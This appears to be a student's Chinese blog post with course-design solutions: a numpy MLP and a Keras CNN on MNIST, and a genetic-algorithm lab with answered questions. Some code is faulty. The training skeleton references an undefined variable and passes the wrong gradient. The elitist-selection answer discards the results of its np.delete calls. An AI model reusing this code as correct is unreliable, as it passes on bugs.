bottom_diff[self.input&lt;0] = 0 return bottom_diff Softmax层123456789101112131415161718192021222324252627class SoftmaxLossLayer(object): def __init__(self): print(&#x27;\\tSoftmax loss layer.&#x27;) def forward(self, input): # 前向传播的计算 # TODO：softmax 损失层的前向传播，计算输出结果 input_max = np.max(input, axis=1, keepdims=True) input_exp = np.exp(input - input_max) #Your Code Here# self.prob = input_exp/np.tile(np.sum(input_exp,axis=1),(10,1)).T #Your Code Here# return self.prob def get_loss(self, label): # 计算损失 self.batch_size = self.prob.shape[0] self.label_onehot = np.zeros_like(self.prob) self.label_onehot[np.arange(self.batch_size), label] = 1.0 loss = -np.sum(np.log(self.prob) * self.label_onehot) / self.batch_size return loss def backward(self): # 反向传播的计算 # TODO：softmax 损失层的反向传播，计算本层损失 #Your Code Here# bottom_diff = (self.prob-self.label_onehot)/ self.batch_size #Your Code Here# return bottom_diff 网络结构模块1234567891011121314151617181920212223242526272829class MNIST_MLP(object): def __init__(self, batch_size=100, input_size=784, hidden1=32, hidden2=16, out_classes=10, lr=0.01, max_epoch=2, print_iter=100): # 神经网络初始化 self.batch_size = batch_size self.input_size = input_size self.hidden1 = hidden1 self.hidden2 = hidden2 self.out_classes = out_classes self.lr = lr self.max_epoch = max_epoch self.print_iter = print_iter def build_model(self): # 建立网络结构 # TODO：建立三层神经网络结构 print(&#x27;Building multi-layer perception model...&#x27;) self.fc1 = FullyConnectedLayer(self.input_size, self.hidden1) self.relu1 = ReLULayer() #Your Code Here# self.fc2 = FullyConnectedLayer(self.hidden1,self.hidden2) self.relu2 = ReLULayer() #Your Code Here# self.fc3 = FullyConnectedLayer(self.hidden2, self.out_classes) self.softmax = SoftmaxLossLayer() self.update_layer_list = [self.fc1, self.fc2, self.fc3] def init_model(self): print(&#x27;Initializing parameters of each layer in MLP...&#x27;) for layer in self.update_layer_list: layer.init_param() 网络训练模块12345678910111213141516171819202122232425262728293031323334353637383940414243def forward(self, input): # 神经网络的前向传播 # TODO：神经网络的前向传播 h1 = self.fc1.forward(input) h1 = self.relu1.forward(h1) #Your Code Here# h2 = self.fc2.forward(h1) h2 = self.relu2.forward(h2) #Your Code Here# prob = self.softmax.forward(h3) return prob def backward(self): # 神经网络的反向传播 # TODO：神经网络的反向传播 dloss = self.softmax.backward() #Your Code Here# dh2 = self.fc3.backward(dloss) dh2 = self.relu2.backward(dh2) dh1 = self.fc2.backward(dh2) #Your Code Here# dh1 = self.relu1.backward(dh2) dh1 = self.fc1.backward(dh1) def update(self, lr): # 神经网络的参数更新 for layer in self.update_layer_list: layer.update_param(lr) def train(self): # 训练函数 max_batch = self.train_data.shape[0] // self.batch_size print(&#x27;Start training...&#x27;) for idx_epoch in range(self.max_epoch): self.shuffle_data() for idx_batch in range(max_batch): batch_images = self.train_data[idx_batch*self.batch_size:(idx_batch+1)*self.batch_size, :-1] batch_labels = self.train_data[idx_batch*self.batch_size:(idx_batch+1)*self.batch_size, -1] prob = self.forward(batch_images) loss = self.softmax.get_loss(batch_labels) self.backward() self.update(self.lr) if idx_batch % self.print_iter == 0: print(&#x27;Epoch %d, iter %d, loss: %.6f&#x27; % (idx_epoch, idx_batch, loss)) shuffle的作用及max_batch的意义max_batch = self.train_data.shape[0] // self.batch_size 表示分组，即一个样本计算一次偏导更新一次权值还是多个样本计算一次偏导，更新一次权值。 以猫狗分类为例， 假如数据集是 Dog，Dog，Dog，… ，Dog，Dog，Dog，Cat，Cat，Cat，Cat，… ，Cat，Cat 所有的狗都在猫前面，如果不shuffle，模型训练一段时间内只看到了Dog，必然会过拟合于Dog，一段时间内又只能看到Cat，必然又过拟合于Cat，这样的模型泛化能力必然很差。 那如果Dog和Cat一直交替，会不会就不过拟合了呢？ Dog，Cat，Dog，Cat，Dog ，Cat，Dog，… 依然会过拟合，模型是会记住训练数据路线的，为什么呢？ 当用随机梯度下降法训练神经网络时，通常的做法是洗牌数据。在纠结细节的情况下，让我们用一个极端的例子来解释为什么shuffle是有用的。假设你正在训练一个分类器来区分猫和狗，你的训练集是50,000只猫后面跟着50,000只狗。如果你不洗牌，你的训练成绩就会很差。 严格地说，这个问题是由梯度噪声中的序列相关性和参数更新的不可交换性引起的。首先我们需要明白固定的数据集顺序，意味着给定迭代步，对应此迭代步的训练数据是固定的。 假如目标函数是J=f(w,b)J=f(w,b)，使用梯度下降优化JJ。给定权重取值w、bw、b和迭代步step的情况下，固定的数据集顺序意味着固定的训练样本，也就意味着权值更新的方向是固定的，而无顺序的数据集，意味着更新方向是随机的。所以固定的数据集顺序，严重限制了梯度优化方向的可选择性，导致收敛点选择空间严重变少，容易导致过拟合。所以模型是会记住数据路线的，所以shuffle很重要，一定shuffle。 摘自 https://deepindeed.cn/2019/12/23/Data-Shuffle/ 完整代码：全连接神经网络layers_1.py: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677# coding=utf-8import numpy as npimport structimport osimport timeclass FullyConnectedLayer(object): def __init__(self, num_input, num_output): # 全连接层初始化 self.num_input = num_input self.num_output = num_output print(&#x27;\\tFully connected layer with input %d, output %d.&#x27; % (self.num_input, self.num_output)) def init_param(self, std=0.01): # 参数初始化 self.weight = np.random.normal(loc=0.0, scale=std, size=(self.num_input, self.num_output)) self.bias = np.zeros([1, self.num_output]) def forward(self, input): # 前向传播计算 start_time = time.time() self.input = input # TODO：全连接层的前向传播，计算输出结果 # 修改代码处 self.output = np.matmul(self.input,self.weight)+self.bias return self.output def backward(self, top_diff): # 反向传播的计算 # TODO：全连接层的反向传播，计算参数梯度和本层损失 # 修改代码处 self.d_weight = np.dot(self.input.T,top_diff) self.d_bias = top_diff bottom_diff = np.dot(top_diff,self.weight.T) # 修改代码处 return bottom_diff def update_param(self, lr): # 参数更新 # TODO：对全连接层参数利用参数进行更新 # 修改代码处 self.weight = self.weight-lr*self.d_weight self.bias = self.bias-lr*self.d_bias # 修改代码处 def load_param(self, weight, bias): # 参数加载 assert self.weight.shape == weight.shape assert self.bias.shape == bias.shape self.weight = weight self.bias = bias def save_param(self): # 参数保存 return self.weight, self.biasclass ReLULayer(object): def __init__(self): print(&#x27;\\tReLU layer.&#x27;) def forward(self, input): # 前向传播的计算 start_time = time.time() self.input = input # TODO：ReLU层的前向传播，计算输出结果 output = np.maximum(self.input,0) return output def backward(self, top_diff): # 反向传播的计算 # TODO：ReLU层的反向传播，计算本层损失 bottom_diff = top_diff bottom_diff[self.input&lt;0] = 0 return bottom_diffclass SoftmaxLossLayer(object): def __init__(self): print(&#x27;\\tSoftmax loss layer.&#x27;) def forward(self, input): # 前向传播的计算 # TODO：softmax 损失层的前向传播，计算输出结果 input_max = np.max(input, axis=1, keepdims=True) input_exp = np.exp(input - input_max) self.prob = input_exp/np.tile(np.sum(input_exp,axis=1),(10,1)).T return self.prob def get_loss(self, label): # 计算损失 self.batch_size = self.prob.shape[0] self.label_onehot = np.zeros_like(self.prob) self.label_onehot[np.arange(self.batch_size), label] = 1.0 loss = -np.sum( self.label_onehot*np.log(self.prob)) / self.batch_size return loss def backward(self): # 反向传播的计算 # TODO：softmax 损失层的反向传播，计算本层损失 bottom_diff = (self.prob-self.label_onehot)/ self.batch_size return bottom_diff mnist_mlp_cpu.py: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161# coding=utf-8import numpy as npimport structimport osimport timefrom layers_1 import FullyConnectedLayer, ReLULayer, SoftmaxLossLayerMNIST_DIR = &quot;./mnist_data&quot;TRAIN_DATA = &quot;train-images-idx3-ubyte&quot;TRAIN_LABEL = &quot;train-labels-idx1-ubyte&quot;TEST_DATA = &quot;t10k-images-idx3-ubyte&quot;TEST_LABEL = &quot;t10k-labels-idx1-ubyte&quot;def show_matrix(mat, name): #print(name + str(mat.shape) + &#x27; mean %f, std %f&#x27; % (mat.mean(), mat.std())) passclass MNIST_MLP(object): def __init__(self, batch_size=100, input_size=784, hidden1=32, hidden2=16, out_classes=10, lr=0.01, max_epoch=2, print_iter=100): # 神经网络初始化 self.batch_size = batch_size self.input_size = input_size self.hidden1 = hidden1 self.hidden2 = hidden2 self.out_classes = out_classes self.lr = lr self.max_epoch = max_epoch self.print_iter = print_iter def load_mnist(self, file_dir, is_images = &#x27;True&#x27;): # Read binary data bin_file = open(file_dir, &#x27;rb&#x27;) bin_data = bin_file.read() bin_file.close() # Analysis file header if is_images: # Read images fmt_header = &#x27;&gt;iiii&#x27; magic, num_images, num_rows, num_cols = struct.unpack_from(fmt_header, bin_data, 0) else: # Read labels fmt_header = &#x27;&gt;ii&#x27; magic, num_images = struct.unpack_from(fmt_header, bin_data, 0) num_rows, num_cols = 1, 1 data_size = num_images * num_rows * num_cols mat_data = struct.unpack_from(&#x27;&gt;&#x27; + str(data_size) + &#x27;B&#x27;, bin_data, struct.calcsize(fmt_header)) mat_data = np.reshape(mat_data, [num_images, num_rows * num_cols]) print(&#x27;Load images from %s, number: %d, data shape: %s&#x27; % (file_dir, num_images, str(mat_data.shape))) return mat_data def load_data(self): # TODO: 调用函数 load_mnist 读取和预处理 MNIST 中训练数据和测试数据的图像和标记 print(&#x27;Loading MNIST data from files...&#x27;) train_images = self.load_mnist(os.path.join(MNIST_DIR, TRAIN_DATA), True) train_labels = self.load_mnist(os.path.join(MNIST_DIR,TRAIN_LABEL),False) test_images = self.load_mnist(os.path.join(MNIST_DIR,TEST_DATA),True) test_labels = self.load_mnist(os.path.join(MNIST_DIR,TEST_LABEL ),False) self.train_data = np.append(train_images, train_labels, axis=1) self.test_data = np.append(test_images, test_labels, axis=1) # self.test_data = np.concatenate((self.train_data, self.test_data), axis=0) def shuffle_data(self): print(&#x27;Randomly shuffle MNIST data...&#x27;) np.random.shuffle(self.train_data) def build_model(self): # 建立网络结构 # TODO：建立三层神经网络结构 print(&#x27;Building multi-layer perception model...&#x27;) self.fc1 = FullyConnectedLayer(self.input_size, self.hidden1) self.relu1 = ReLULayer() self.fc2 = FullyConnectedLayer(self.hidden1,self.hidden2) self.relu2 = ReLULayer() self.fc3 = FullyConnectedLayer(self.hidden2, self.out_classes) self.softmax = SoftmaxLossLayer() self.update_layer_list = [self.fc1, self.fc2, self.fc3] def init_model(self): print(&#x27;Initializing parameters of each layer in MLP...&#x27;) for layer in self.update_layer_list: layer.init_param() def load_model(self, param_dir): # 加载神经网络权值 print(&#x27;Loading parameters from file &#x27; + param_dir) params = np.load(param_dir, allow_pickle=True).item() self.fc1.load_param(params[&#x27;w1&#x27;], params[&#x27;b1&#x27;]) self.fc2.load_param(params[&#x27;w2&#x27;], params[&#x27;b2&#x27;]) self.fc3.load_param(params[&#x27;w3&#x27;], params[&#x27;b3&#x27;]) def save_model(self, param_dir): print(&#x27;Saving parameters to file &#x27; + param_dir) params = &#123;&#125; params[&#x27;w1&#x27;], params[&#x27;b1&#x27;] = self.fc1.save_param() params[&#x27;w2&#x27;], params[&#x27;b2&#x27;] = self.fc2.save_param() params[&#x27;w3&#x27;], params[&#x27;b3&#x27;] = self.fc3.save_param() np.save(param_dir, params) def forward(self, input): # 神经网络的前向传播 # TODO：神经网络的前向传播 h1 = self.fc1.forward(input) h1 = self.relu1.forward(h1) h2 = self.fc2.forward(h1) h2 = self.relu2.forward(h2) h3 = self.fc3.forward(h2) self.prob = self.softmax.forward(h3) return self.prob def backward(self): # 神经网络的反向传播 # TODO：神经网络的反向传播 dloss = self.softmax.backward() dh2 = self.fc3.backward(dloss) dh2 = self.relu2.backward(dh2) dh1 = self.fc2.backward(dh2) dh1 = self.relu1.backward(dh1) dh1 = self.fc1.backward(dh1) def update(self, lr): # 神经网络的参数更新 for layer in self.update_layer_list: layer.update_param(lr) def train(self): # 训练函数 max_batch = self.train_data.shape[0] // self.batch_size print(&#x27;Start training...&#x27;) for idx_epoch in range(self.max_epoch): self.shuffle_data() for idx_batch in range(max_batch): batch_images = self.train_data[idx_batch*self.batch_size:(idx_batch+1)*self.batch_size, :-1] batch_labels = self.train_data[idx_batch*self.batch_size:(idx_batch+1)*self.batch_size, -1] prob = self.forward(batch_images) loss = self.softmax.get_loss(batch_labels) self.backward() self.update(self.lr) if idx_batch % self.print_iter == 0: print(&#x27;Epoch %d, iter %d, loss: %.6f&#x27; % (idx_epoch, idx_batch, loss)) def evaluate(self): #推断函数 pred_results = np.zeros([self.test_data.shape[0]]) start_time = time.time() for idx in range(self.test_data.shape[0]//self.batch_size): batch_images = self.test_data[idx*self.batch_size:(idx+1)*self.batch_size, :-1] prob = self.forward(batch_images) end = time.time() pred_labels = np.argmax(prob, axis=1) pred_results[idx*self.batch_size:(idx+1)*self.batch_size] = pred_labels print(&quot;All evaluate time: %f&quot;%(time.time()-start_time)) accuracy = np.mean(pred_results == self.test_data[:,-1]) print(&#x27;Accuracy in test set: %f&#x27; % accuracy)if __name__ == &#x27;__main__&#x27;: h1, h2, e = 32, 16, 1 mlp = MNIST_MLP(hidden1=h1, hidden2=h2, max_epoch=e) mlp.load_data() mlp.build_model() mlp.init_model() start_time = time.time() mlp.train() print(&quot;All train time: %f&quot;%(time.time()-start_time)) mlp.save_model(&#x27;mlp-%d-%d-%depoch.npy&#x27; % (h1, h2, e)) mlp.load_model(&#x27;mlp-%d-%d-%depoch.npy&#x27; % (h1, h2, e)) mlp.evaluate() 卷积神经网络123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import tensorflow as tffrom tensorflow.keras.models import Sequentialfrom tensorflow.keras.layers import Dense,Dropout,Flatten,Convolution2D,MaxPooling2Dfrom tensorflow.keras.optimizers import Adamimport matplotlib.pyplot as pltimport numpy as np# 载入数据集mnist = tf.keras.datasets.mnist(x_train,y_train),(x_test,y_test) = mnist.load_data()x_train = x_train.reshape(-1,28,28,1)/255.0x_test = x_test.reshape(-1,28,28,1)/255.0y_train = tf.keras.utils.to_categorical(y_train,num_classes=10)y_test = tf.keras.utils.to_categorical(y_test,num_classes=10)model = Sequential()model.add(Convolution2D( input_shape = (28,28,1), filters = 32, kernel_size = 5, strides = 1, padding = &#x27;same&#x27;, activation = &#x27;relu&#x27;))model.add(MaxPooling2D( pool_size = 2, strides =2, padding = &#x27;same&#x27;))model.add(Convolution2D(64,5,strides = 1,padding = &#x27;same&#x27;,activation = &#x27;relu&#x27;))model.add(MaxPooling2D(2,2,&#x27;same&#x27;))model.add(Flatten())model.add(Dense(1024,activation=&#x27;relu&#x27;))model.add(Dropout(0.5))model.add(Dense(10,activation = &#x27;softmax&#x27;))adam = Adam(lr = 1e-4)model.compile(optimizer=adam,loss=&#x27;categorical_crossentropy&#x27;,metrics=[&#x27;accuracy&#x27;])model.fit(x_train,y_train,batch_size = 64,epochs = 10,validation_data = (x_test,y_test))model.save(&#x27;mnist.h5&#x27;) 效果：","comments":true,"categories":[{"name":"人工智能","slug":"人工智能","permalink":"http://1905060202.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"}],"tags":[{"name":"人工智能","slug":"人工智能","permalink":"http://1905060202.github.io/tags/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"},{"name":"课程设计","slug":"课程设计","permalink":"http://1905060202.github.io/tags/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"},{"name":"计算智能","slug":"计算智能","permalink":"http://1905060202.github.io/tags/%E8%AE%A1%E7%AE%97%E6%99%BA%E8%83%BD/"}]},{"title":"计算智能课程设计(遗传算法求解无约束单目标优化问题)","date":"2021-12-04T00:04:54.000Z","path":"2021/12/04/计算智能课程设计-遗传算法求解无约束单目标优化问题/","text":"写在前面前天写完了基于传递闭包的模糊聚类，今天准备写“遗传算法求解无约束单目标优化问题”。昨天和npy玩了一下午，去齐白石艺术学院看了画展，一起在最高处看了夕阳，并在落日前接吻。 实验题目遗传算法求解无约束单目标优化问题 实验目的理解遗传算法原理，掌握遗传算法的基本求解步骤，包括选择、交叉、变异等，学会运用遗传算法求解无约束单目标优化问题。 背景知识遗传算法(Genetic Algorithm)是借鉴生物界自然选择、适者生存遗传机制的一种随机搜索方法。遗传算法模拟了进化生物学中的遗传、突变、自然选择以及杂交等现象，是进化算法的一种。对于一个最优化问题，一定数量的候选解(每个候选解称为一个个体)的抽象表示(也称为染色体)的种群向更好的方向解进化，通过一代一代不断繁衍，使种群收敛于最适应的环境，从而求得问题的最优解。进化从完全随机选择的个体种群开始，一代一代繁殖、进化。在每一代中，整个种群的每个个体的适应度被评价,从当前种群中随机地选择多个个体(基于它们的适应度)，通过自然选择、优胜劣汰和突变产生新的种群，该种群在算法的下一次迭代中成为当前种群。传统上，解一般用二进制表示(0 和 1 组成的串)。遗传算法的主要特点是直接对结构对象进行操作，不存在函数求导、连续、单峰的限定；具有内在的隐闭并行性和更好的全局寻优能力;采用概率化的寻优方法，能自动获取和指导优化搜索，自适应调整搜索方向，不需要确定的规则。遗传算法已被人们广泛地应用于组合优化、机器学习、信号处理、自适应控制和人工智能等领域中的问题求解，已成为现代智能计算中的一项关键技术。 关键术语：(1)个体( individuals):遗传算法中所处理的对象称为个体。个体通常可以含解的编码表示形式、适应度值等构成成分，因而可看成是一个结构整体。其中，主要成分是编码。 (2)种群(population):由个体构成的集合称为种群。 (3)位串(bit string):解的编码表示形式称为位串。解的编码表示可以是 0、1 二值串、0～9 十进制数字串或其他形式的串，可称为字符串或简称为串。位串和染色体(chromosome)相对应。在遗传算法的描述中，经常不加区分地使用位串和染色体这两个概念。位串/染色体与个体的关系:位串/染色体一般是个体的成分，个体还可含有适度值等成分。个体、染色体、位串或字符串有时在遗传算法中可不加区分地使用。 (4)种群规模(population scale):又称种群大小,指种群中所含个体的数目。 (5)基因(gene):位串中的每个位或元素统称为基因。基因反映个体的特征。同一位上的基因不同，个体的特征可能也不相同。基因对应于遗传学中的遗传物质单位。在 DNA 序列表示中，遗传物质单位也是用特定编码表示的。遗传算法中扩展了编码的概念，对于可行解，可用 0、1 二值、0~9 十个数字,以及其他形式的编码表示。例如，在 0、1 二值编码下，有一个串 S=1011，则其中的 1，0，1，1这 4 个元素分别称为基因。基因和位在遗传算法中也可不加区分地使用。 (6)适应度(fitness):个体对环境的适应程度称为适应度(fitness)。为了体现染色体的适应能力，通常引入一个对每个染色体都能进行度量的函数﹐称为适应度函数。 (7)选择(selection):在整个种群或种群的一部分中选择某个个体的操作。 (8)交叉(crossover):两个个体对应的一个或多个基因段的交换操作。 (9)变异(mutation):个体位串上某个基因的取值发生变化。如在 0、1 串表示下，某位的值从 0 变为 1，或由 1 变为 0。 遗传算法的基本流程如下： 本案例意在说明如何使用遗传算法求解无约束单目标优化问题，即求一元函数： 在区间[-1, 2]上的最大值。该函数图像如下： 由图像可知该函数在在区间[-1, 2]上有很多极大值和极小值，对于求其最大值或最小值的问题，很多单点优化的方法（梯度下降等）就不适合，这种情况下可以考虑使用遗传算法。。 示例代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150import numpy as npimport matplotlib.pyplot as pltdef fun(x): return x * np.sin(10*np.pi*x) + 2Xs = np.linspace(-1, 2, 100)np.random.seed(0) # 令随机数种子=0，确保每次取得相同的随机数# 初始化原始种群population = np.random.uniform(-1, 2, 10) # 在[-1,2)上以均匀分布生成10个浮点数，做为初始种群for pop, fit in zip(population, fun(population)): print(&quot;x=%5.2f, fit=%.2f&quot; % (pop, fit))plt.plot(Xs, fun(Xs))plt.plot(population, fun(population), &#x27;*&#x27;)plt.show()def encode(population, _min=-1, _max=2, scale=2**18, binary_len=18): # population必须为float类型，否则精度不能保证 # 标准化，使所有数据位于0和1之间,乘以scale使得数据间距拉大以便用二进制表示 normalized_data = (population-_min) / (_max-_min) * scale # 转成二进制编码 binary_data = np.array([np.binary_repr(x, width=binary_len) for x in normalized_data.astype(int)]) return binary_datachroms = encode(population) # 染色体英文(chromosome)for pop, chrom, fit in zip(population, chroms, fun(population)): print(&quot;x=%.2f, chrom=%s, fit=%.2f&quot; % (pop, chrom, fit))def decode(popular_gene, _min=-1, _max=2, scale=2**18): # 先把x从2进制转换为10进制，表示这是第几份 # 乘以每份长度（长度/份数）,加上起点,最终将一个2进制数，转换为x轴坐标 return np.array([(int(x, base=2)/scale*3)+_min for x in popular_gene])fitness = fun(decode(chroms))for pop, chrom, dechrom, fit in zip(population, chroms, decode(chroms), fitness): print(&quot;x=%5.2f, chrom=%s, dechrom=%.2f, fit=%.2f&quot; % (pop, chrom, dechrom, fit))fitness = fitness - fitness.min() + 0.000001 # 保证所有的都为正print(fitness)def Select_Crossover(chroms, fitness, prob=0.6): # 选择和交叉 probs = fitness/np.sum(fitness) # 各个个体被选择的概率 probs_cum = np.cumsum(probs) # 概率累加分布 each_rand = np.random.uniform(size=len(fitness)) # 得到10个随机数，0到1之间 # 轮盘赌，根据随机概率选择出新的基因编码 # 对于each_rand中的每个随机数，找到被轮盘赌中的那个染色体 newX = np.array([chroms[np.where(probs_cum &gt; rand)[0][0]] for rand in each_rand]) # 繁殖，随机配对（概率为0.6) # 6这个数字怎么来的，根据遗传算法，假设有10个数，交叉概率为0.6，0和1一组，2和3一组。。。8和9一组，每组扔一个0到1之间的数字 # 这个数字小于0.6就交叉，则平均下来应有三组进行交叉，即6个染色体要进行交叉 pairs = np.random.permutation( int(len(newX)*prob//2*2)).reshape(-1, 2) # 产生6个随机数，乱排一下，分成二列 center = len(newX[0])//2 # 交叉方法采用最简单的，中心交叉法 for i, j in pairs: # 在中间位置交叉 x, y = newX[i], newX[j] newX[i] = x[:center] + y[center:] # newX的元素都是字符串，可以直接用+号拼接 newX[j] = y[:center] + x[center:] return newXchroms = Select_Crossover(chroms, fitness)dechroms = decode(chroms)fitness = fun(dechroms)for gene, dec, fit in zip(chroms, dechroms, fitness): print(&quot;chrom=%s, dec=%5.2f, fit=%.2f&quot; % (gene, dec, fit))# 对比一下选择和交叉之后的结果fig, (axs1, axs2) = plt.subplots(1, 2, figsize=(14, 5))axs1.plot(Xs, fun(Xs))axs1.plot(population, fun(population), &#x27;o&#x27;)axs2.plot(Xs, fun(Xs))axs2.plot(dechroms, fitness, &#x27;*&#x27;)plt.show()# 输入一个原始种群1，输出一个变异种群2 函数参数中的冒号是参数的类型建议符，告诉程序员希望传入的实参的类型。函数后面跟着的箭头是函数返回值的类型建议符，用来说明该函数返回的值是什么类型。def Mutate(chroms: np.array): prob = 0.1 # 变异的概率 clen = len(chroms[0]) # chroms[0]=&quot;111101101 000010110&quot; 字符串的长度=18 m = &#123;&#x27;0&#x27;: &#x27;1&#x27;, &#x27;1&#x27;: &#x27;0&#x27;&#125; # m是一个字典，包含两对：第一对0是key而1是value；第二对1是key而0是value newchroms = [] # 存放变异后的新种群 each_prob = np.random.uniform(size=len(chroms)) # 随机10个数 for i, chrom in enumerate(chroms): # enumerate的作用是整一个i出来 if each_prob[i] &lt; prob: # 如果要进行变异(i的用处在这里) pos = np.random.randint(clen) # 从18个位置随机中找一个位置，假设是7 # 0~6保持不变，8~17保持不变，仅将7号翻转，即0改为1，1改为0。注意chrom中字符不是1就是0 chrom = chrom[:pos] + m[chrom[pos]] + chrom[pos+1:] newchroms.append(chrom) # 无论if是否成立，都在newchroms中增加chroms的这个元素 return np.array(newchroms) # 返回变异后的种群newchroms = Mutate(chroms)def DrawTwoChroms(chroms1, chroms2, fitfun): # 画2幅图，左边是旧种群，右边是新种群，观察平行的两幅图可以看出有没有差异 Xs = np.linspace(-1, 2, 100) fig, (axs1, axs2) = plt.subplots(1, 2, figsize=(14, 5)) dechroms = decode(chroms1) fitness = fitfun(dechroms) axs1.plot(Xs, fitfun(Xs)) axs1.plot(dechroms, fitness, &#x27;o&#x27;) dechroms = decode(chroms2) fitness = fitfun(dechroms) axs2.plot(Xs, fitfun(Xs)) axs2.plot(dechroms, fitness, &#x27;*&#x27;) plt.show()# 对比一下变异前后的结果DrawTwoChroms(chroms, newchroms, fun)# 上述代码只是执行了一轮，这里反复迭代np.random.seed(0) # population = np.random.uniform(-1, 2, 100) # 这次多找一些点chroms = encode(population)for i in range(1000): fitness = fun(decode(chroms)) fitness = fitness - fitness.min() + 0.000001 # 保证所有的都为正 newchroms = Mutate(Select_Crossover(chroms, fitness)) if i % 300 == 1: DrawTwoChroms(chroms, newchroms, fun) chroms = newchromsDrawTwoChroms(chroms, newchroms, fun) 实验内容运行和理解示例代码，回答下列问题：1）代码第 64 行的语义是什么？两个[0]各自代表什么？最后 newX 有几个元素？ 123newX = np.array([chroms[np.where(probs_cum &gt; rand)[0][0]]for rand in each_rand]) 2）代码第 70 行的语义是什么？为什么要除以 2 再乘以 2？reshape 中的-1 表示什么？ 123pairs = np.random.permutation(int(len(newX)*prob//2*2)).reshape(-1, 2) # 产生 6 个随机数乱排一下分成二列 3）请结合 Mutate 函数的内容，详述变异是如何实现的。 4）将代码第 145 行修改为 newchroms = Select_Crossover(chroms, fitness)，即不再执行变异，执行结果有什么不同，为什么会出现这种变化？ 5）轮盘让个体按概率被选择，对于适应度最高的个体而言，虽然被选择的概率高，但仍有可能被淘汰，从而在进化过程中失去当前最优秀的个体。一种改进方案是，让适应度最高的那个个体不参与选择，而是直接进入下一轮（直接晋级），这种方案被称为精英选择(elitist selection)。请修改Select 部分的代码，实现这一思路。 6）【选做】请借鉴示例代码，实现教材 P57 的例 2.6.1，即用遗传算法求解下列二元函数的最大值。 实验结果与分析第一题1）代码第 64 行的语义是什么？两个[0]各自代表什么？最后 newX 有几个元素？ 123newX = np.array([chroms[np.where(probs_cum &gt; rand)[0][0]]for rand in each_rand]) 经过拆分，得到结果： 上面的代码等于 其中[]中的for为列表生成式，返回一个列表。第一个[0]表示np.where()生成tuple元组中数组的行索引，np.where()[0]的值是tuple中的第一个数组，第二个[0]是该数组的首位元素。 最后newX一共有100个元素。 第二题2）代码第 70 行的语义是什么？为什么要除以 2 再乘以 2？reshape 中的-1 表示什么？ 123pairs = np.random.permutation(int(len(newX)*prob//2*2)).reshape(-1, 2) # 产生 6 个随机数乱排一下分成二列 随机生成6个在[0,5]之间的数字，并将其排列成二维的形状是(3,2)的数组。 prob可能是奇数，这样乘上去没法取到整数分组，所以要//2取整。染色体是两两配对，所以要乘2。 reshape中的-1表示，通过列数对数组的行数进行自动计算。新的shape属性应该要与原来的配套，如果等于-1的话，那么Numpy会根据剩下的维度计算出数组的另外一个shape属性值。 第三题3）请结合 Mutate 函数的内容，详述变异是如何实现的。 1234567891011121314def Mutate(chroms: np.array): prob = 0.1 # 变异的概率 clen = len(chroms[0]) # chroms[0]=&quot;111101101 000010110&quot; 字符串的长度=18 m = &#123;&#x27;0&#x27;: &#x27;1&#x27;, &#x27;1&#x27;: &#x27;0&#x27;&#125; # m是一个字典，包含两对：第一对0是key而1是value；第二对1是key而0是value newchroms = [] # 存放变异后的新种群 each_prob = np.random.uniform(size=len(chroms)) # 随机10个数 for i, chrom in enumerate(chroms): # enumerate的作用是整一个i出来 if each_prob[i] &lt; prob: # 如果要进行变异(i的用处在这里) pos = np.random.randint(clen) # 从18个位置随机中找一个位置，假设是7 # 0~6保持不变，8~17保持不变，仅将7号翻转，即0改为1，1改为0。注意chrom中字符不是1就是0 chrom = chrom[:pos] + m[chrom[pos]] + chrom[pos+1:] newchroms.append(chrom) # 无论if是否成立，都在newchroms中增加chroms的这个元素 return np.array(newchroms) # 返回变异后的种群 首先，得到变异概率与单个染色体的长度(二进制数位数)，再利用字典对变异的两种情况做一个存储。 newchroms是存放变异后新种群的array。 通过each_prob计算出每个染色体的随机变异概率 遍历染色体，如果随机变异概率低于变异概率，则发生变异 发生变异，通过计算pos，从染色体中随机找个位置变异，即二进制数某个位发生突变 无论染色体是否发生变异，都在新种群中添加染色体(发生突变的与岁月静好的都算) 返回整个新的种群 第四题4）将代码第 145 行修改为 newchroms = Select_Crossover(chroms, fitness)，即不再执行变异，执行结果有什么不同，为什么会出现这种变化？ 未修改前： 修改后： 执行结果变化如上。 染色体进行过交叉后，不再发生变异。少了一次变异，新种群与原种群概率上讲，差异要更小一些。结果可能不会产生最大值。 第五题5）轮盘让个体按概率被选择，对于适应度最高的个体而言，虽然被选择的概率高，但仍有可能被淘汰，从而在进化过程中失去当前最优秀的个体。一种改进方案是，让适应度最高的那个个体不参与选择，而是直接进入下一轮（直接晋级），这种方案被称为精英选择(elitist selection)。请修改Select 部分的代码，实现这一思路。 12345678910111213141516171819202122232425262728293031323334def Select_Crossover(chroms, fitness, prob=0.6): # 选择和交叉 probs = fitness/np.sum(fitness) # 各个个体被选择的概率 # 修改代码处 max_probs = probs[np.argmax(probs)] ak = chroms[np.argmax(probs)] np.delete(chroms,np.argmax(probs)) np.delete(probs,np.argmax(probs)) # 修改代码处 probs_cum = np.cumsum(probs) # 概率累加分布 each_rand = np.random.uniform(size=len(fitness)) # 得到10个随机数，0到1之间 # 轮盘赌，根据随机概率选择出新的基因编码 # 对于each_rand中的每个随机数，找到被轮盘赌中的那个染色体 newX = np.array([chroms[np.where(probs_cum &gt; rand)[0][0]] for rand in each_rand]) # 繁殖，随机配对（概率为0.6) # 6这个数字怎么来的，根据遗传算法，假设有10个数，交叉概率为0.6，0和1一组，2和3一组。。。8和9一组，每组扔一个0到1之间的数字 # 这个数字小于0.6就交叉，则平均下来应有三组进行交叉，即6个染色体要进行交叉 pairs = np.random.permutation( int(len(newX)*prob//2*2)).reshape(-1, 2) # 产生6个随机数，乱排一下，分成二列 center = len(newX[0])//2 # 交叉方法采用最简单的，中心交叉法 for i, j in pairs: # 在中间位置交叉 x, y = newX[i], newX[j] 